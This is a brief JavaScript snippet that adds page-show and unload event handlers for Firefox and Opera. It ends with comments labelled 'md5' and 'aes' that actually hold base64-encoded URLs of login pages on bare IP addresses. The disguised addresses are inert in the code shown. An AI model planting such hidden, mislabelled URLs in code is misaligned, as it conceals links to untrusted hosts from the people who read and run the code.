if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzQ3LjEyMi41LjE3Mjo4MDA4LyMvbG9naW4vbG9naW4saHR0cDovLzQ3LjExNS4yMTAuMTM2OjgwMDgvIy9sb2dpbi9sb2dpbiw=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/